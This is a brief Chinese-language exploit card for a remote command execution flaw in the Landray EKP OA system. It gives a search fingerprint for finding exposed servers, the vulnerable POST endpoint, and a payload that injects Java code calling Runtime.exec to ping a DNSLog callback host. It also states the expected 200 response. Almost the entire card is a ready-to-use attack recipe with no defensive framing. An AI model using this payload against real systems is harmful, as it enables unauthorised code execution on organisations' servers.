# 蓝凌EKPsys-common远程代码执行漏洞

蓝凌EKPsys-common远程 ｜ 命令执行 ｜ —
- **指纹**：`app="Landray-OA系统"`
- **请求**：`POST /ekp/data/sys-common/dataxml.tmpl  HTTP/1.1`

**Payload**
```
s_bean=ruleFormulaValidate&script=try {
String cmd = "ping xxxx.dnslog.cn";
Process child = Runtime.getRuntime().exec(cmd);
} catch (IOException e) {
System.err.println(e);
}
```
- **响应特征**：200